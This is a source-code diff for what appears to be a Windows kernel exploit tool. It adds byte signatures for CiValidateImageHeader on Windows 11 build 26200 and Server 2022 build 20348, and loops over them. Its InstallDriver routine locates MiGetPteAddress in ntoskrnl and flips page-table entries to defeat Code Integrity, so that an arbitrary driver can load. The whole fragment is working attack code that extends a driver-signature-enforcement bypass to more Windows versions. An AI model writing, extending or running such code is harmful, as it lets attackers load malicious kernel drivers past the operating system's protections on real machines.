@@ -5,6 +5,40 @@
 #include "service.h"
 #include <stdio.h>
 
+typedef struct {
+    const char* name;
+    const char* sig;
+    int         len;
+} CiSigVariant;
+
+static const CiSigVariant* GetCiValidateImageHeaderSigs(int* outCount) {
+    // lea rbp,[rsp-90h] — Win11 26200
+    static const char CiSig_Win11[] = {
+        0x48, 0x89, 0x5c, 0x24, 0x20, 0x55, 0x56, 0x57, 0x41, 0x54,
+        0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0xac, 0x24,
+        0x70, 0xff, 0xff, 0xff
+    };
+    // lea rbp,[rsp-60h] — Server 2022 20348
+    static const char CiSig_Server2022[] = {
+        0x48, 0x89, 0x5c, 0x24, 0x20, 0x55, 0x56, 0x57, 0x41, 0x54,
+        0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x6c, 0x24,
+        0xa0
+    };
+
+    static const CiSigVariant variants[] = {
+        { "Win11/26200",      CiSig_Win11,      sizeof(CiSig_Win11)      },
+        { "Server2022/20348", CiSig_Server2022, sizeof(CiSig_Server2022) },
+    };
+
+    *outCount = sizeof(variants) / sizeof(variants[0]);
+    return variants;
+}
+
+static const char MiGetPteAddressSig[] = {
+    0x48, 0xc1, 0xe9, 0x09, 0x48, 0xb8, 0xf8, 0xff, 0xff, 0xff,
+    0x7f, 0x00, 0x00, 0x00, 0x48, 0x23, 0xc8, 0x48, 0xb8
+};
+
 BOOL InstallDriver(HANDLE device, char* driverPath, char* serviceName) {
     BOOL result     = FALSE;
     BOOL pteFlipped = FALSE;
@@ -15,15 +49,8 @@ BOOL InstallDriver(HANDLE device, char* driverPath, char* serviceName) {
     PVOID kernelMap = MapFileIntoMemory("C:\\Windows\\System32\\ntoskrnl.exe");
     printf("[*] kernelMap (User-mode allocation): 0x%p\n", kernelMap);
 
-    const char MiGetPteAddressSig[] = {
-        0x48, 0xc1, 0xe9, 0x09, 0x48, 0xb8, 0xf8, 0xff, 0xff, 0xff,
-        0x7f, 0x00, 0x00, 0x00, 0x48, 0x23, 0xc8, 0x48, 0xb8
-    };
-    const char CiValidateImageHeaderSig[] = {
-        0x48, 0x89, 0x5c, 0x24, 0x20, 0x55, 0x56, 0x57, 0x41, 0x54,
-        0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0xac, 0x24,
-        0x70, 0xff, 0xff, 0xff
-    };
+    int                 sigCount;
+    const CiSigVariant* ciSigs = GetCiValidateImageHeaderSigs(&sigCount);
 
     DWORD64 kernelBase = GetKernelBaseAddress();
     DWORD64 ciBase     = GetCIBaseAddress();
@@ -42,9 +69,15 @@ BOOL InstallDriver(HANDLE device, char* driverPath, char* serviceName) {
     printf("[+] MiGetPteAddress:       0x%p\n", (void*)MiGetPteAddress);
     printf("[+] targetConstantAddress: 0x%p\n", (void*)targetConstantAddress);
 
-    gadgetSearch = SearchSignatureInSection(
-        (char*)"PAGE", (char*)ciMap,
-        (char*)CiValidateImageHeaderSig, sizeof(CiValidateImageHeaderSig));
+    for (int i = 0; i < sigCount; i++) {
+        gadgetSearch = SearchSignatureInSection(
+            (char*)"PAGE", (char*)ciMap,
+            (char*)ciSigs[i].sig, ciSigs[i].len);
+        if (gadgetSearch) {
+            printf("[+] CiValidateImageHeader matched: %s\n", ciSigs[i].name);
+            break;
+        }
+    }
     if (!gadgetSearch) {
         printf("[-] CiValidateImageHeader signature not found\n");
         goto cleanup;
